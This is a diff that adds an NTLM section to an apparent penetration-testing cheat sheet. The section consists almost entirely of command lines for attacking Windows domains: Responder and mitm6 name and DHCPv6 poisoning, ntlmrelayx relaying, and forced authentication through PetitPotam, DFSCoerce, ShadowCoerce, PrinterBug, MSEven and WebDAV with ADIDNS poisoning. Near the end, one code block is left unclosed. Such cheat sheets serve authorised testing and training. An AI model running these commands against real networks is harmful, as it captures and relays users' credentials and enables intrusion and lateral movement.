@@ -141,6 +141,7 @@ Thank you for reading.
 		- [ldapsearch](#ldapsearch)
 		- [Linux](#linux-1)
 		- [Microsoft Windows](#microsoft-windows-1)
+		- [NTLM](#ntlm)
 		- [PassTheCert](#passthecert)
 		- [Penelope](#penelope)
 		- [PKINITtools](#pkinittools)
@@ -7119,6 +7120,333 @@ Get-LocalGroupMember administrators
 $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
 Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
+```
+
+#### NTLM
+
+##### NTLM Hash Conversion
+
+```python
+python3 -c 'import hashlib; print(hashlib.new("md4","P@ssw0rd123".encode("utf-16le")).hexdigest())'
+```
+
+##### Unauthenticated
+
+###### LLMNR/mDNS/NBNS Poisoning
+
+###### Capture
+
+```console
+sudo responder -I eth0
+sudo responder -I eth0 -A
+sudo responder -I eth0 -W
+```
+
+###### Relay
+
+```console
+python ntlmrelayx.py -smb2support -t <RHOST>
+python ntlmrelayx.py -6 -smb2support -t <RHOST>
+```
+
+###### DHCPv6 Spoofing
+
+###### Capture
+
+```console
+sudo responder -I eth0 -A
+mitm6 -d <DOMAIN> -hb <LHOST>
+```
+
+###### Relay
+
+```console
+mitm6 -d <DOMAIN> -hb <LHOST>
+python ntlmrelayx.py -6 -smb2support -t <RHOST>
+```
+
+###### PetitPotam
+
+###### Capture
+
+```console
+sudo responder -I eth0 -A
+python PetitPotam.py <LHOST> <RHOST>
+```
+
+or
+
+```console
+sudo responder -I eth0 -A
+netexec smb <RHOST> -M coerce_plus -M Petitpotam -L <LHOST>
+```
+
+###### Relay
+
+```console
+python ntlmrelayx.py -smb2support -t <RHOST>
+python PetitPotam.py <LHOST> <RHOST>
+```
+
+or
+
+```console
+python ntlmrelayx.py -smb2support -t <RHOST>
+netexec smb <RHOST> -M coerce_plus -M Petitpotam -L <LHOST>
+```
+
+##### Authenticated
+
+###### PetitPotam
+
+###### Capture
+
+```console
+sudo responder -I eth0 -A
+python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
+```
+
+or
+
+```console
+sudo responder -I eth0 -A
+netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M Petitpotam -L <LHOST>
+```
+
+###### Relay
+
+```console
+python ntlmrelayx.py -smb2support -t <RHOST>
+python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
+```
+
+or
+
+```console
+python ntlmrelayx.py -smb2support -t <RHOST>
+netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M Petitpotam -L <LHOST>
+```
+
+###### DFSCoerce
+
+###### Capture
+
+```console
+sudo responder -I eth0 -A
+python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
+```
+
+or
+
+```console
+sudo responder -I eth0 -A
+netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M DFSCoerce -L <LHOST>
+```
+
+###### Relay
+
+```console
+python ntlmrelayx.py -smb2support -t <RHOST>
+python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
+```
+
+or
+
+```console
+python ntlmrelayx.py -smb2support -t <RHOST>
+netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M DFSCoerce -L <LHOST>
+```
+
+###### ShadowCoerce
+
+###### Capture
+
+```console
+sudo responder -I eth0 -A
+python shadowcoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
+```
+
+or
+
+```console
+sudo responder -I eth0 -A
+netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M ShadowCoerce -L <LHOST>
+```
+
+###### Relay
+
+```console
+python ntlmrelayx.py -smb2support -t <RHOST>
+python shadowcoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
+```
+
+
+```console
+python ntlmrelayx.py -smb2support -t <RHOST>
+netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M ShadowCoerce -L <LHOST>
+```
+
+###### PrinterBug
+
+###### Capture
+
+```console
+responder -I eth0 -A
+python printerbug.py '<DOMAIN>/<USERNAME>':'<PASSWORD>'@'<RHOST>' <LHOST>
+```
+
+or
+
+```console
+responder -I eth0 -A
+netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M Printerbug -L <LHOST>
+```
+
+###### Relay
+
+```console
+python ntlmrelayx.py -smb2support -t <RHOST>
+python printerbug.py '<DOMAIN>/<USERNAME>':'<PASSWORD>'@'<RHOST>' <LHOST>
+```
+
+or
+
+```console
+python ntlmrelayx.py -smb2support -t <RHOST>
+netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M Printerbug -L <LHOST>
+```
+
+###### MSEven (CheeseOunce)
+
+###### Capture
+
+```console
+sudo responder -I eth0 -A
+python cheese.py '<DOMAIN>/<USERNAME>':'<PASSWORD>'@'<RHOST>' <LHOST>
+```
+
+or
+
+```console
+sudo responder -I eth0 -A
+netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M MSEven -L <LHOST>
+```
+
+###### Relay
+
+```console
+python ntlmrelayx.py -smb2support -t <RHOST>
+python cheese.py '<DOMAIN>/<USERNAME>':'<PASSWORD>'@'<RHOST>' <LHOST>
+```
+
+or
+
+```console
+python ntlmrelayx.py -smb2support -t <RHOST>
+netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M MSEven -L <LHOST>
+```
+
+###### WebDAV Coercion
+
+###### Prerequisites
+
+###### Check for WebClient Service
+
+```console
+webclientservicescanner '<DOMAIN>/<USERNAME>':'<PASSWORD>'@'<RHOST>'
+```
+
+or
+
+```console
+netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M webdav
+```
+
+###### Get a NetBIOS Name
+
+###### LLMNR/mDNS/NBNS Poisoning
+
+```console
+sudo responder -I eth0 -w
+```
+
+###### ADIDNS Poisoning
+
+```console
+python dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -a add -r '<DOMAIN>' -d <LHOST> <RHOST>
+```
+
+###### PetitPotam via WebDAV
+
+###### Capture
+
+###### LLMNR/mDNS/NBNS Poisoning
+
+```console
+sudo responder -I eth0 -w
+python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
+```
+
+###### ADIDNS Poisoning
+
+```console
+sudo responder -I eth0 -A
+python dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -a add -r '<DOMAIN>' -d <LHOST> <RHOST>
+python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
+```
+
+###### Relay
+
+###### LLMNR/mDNS/NBNS Poisoning
+
+```console
+sudo responder -I eth0 -w
+python ntlmrelayx.py --no-smb-server -t <RHOST>
+python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
+```
+
+###### ADIDNS Poisoning
+
+```console
+python dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -a add -r '<DOMAIN>' -d <LHOST> <RHOST>
+python ntlmrelayx.py -t <RHOST> --no-smb-server
+python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAAt@80/foobar' <RHOST>
+```
+
+###### DFSCoerce via WebDAV
+
+###### Capture
+
+###### LLMNR/mDNS/NBNS Poisoning
+
+```console
+sudo responder -I eth0 -w
+python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
+```
+
+###### ADIDNS Poisoning
+
+```console
+sudo responder -I eth0 -A
+python dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -a add -r '<DOMAIN>' -d <LHOST> <RHOST>
+python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
+```
+
+###### Relay
+
+###### LLMNR/mDNS/NBNS Poisoning
+
+```console
+sudo responder -I eth0 -w
+python ntlmrelayx.py --no-smb-server -t <RHOST>
+python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'bogus@80/foobar' <RHOST>
+
+###### ADIDNS Poisoning
+
+```console
+python dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -a add -r '<DOMAIN>' -d <LHOST> <RHOST>
+python ntlmrelayx.py -t <RHOST> --no-smb-server
+python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
 ```
 
 #### PassTheCert
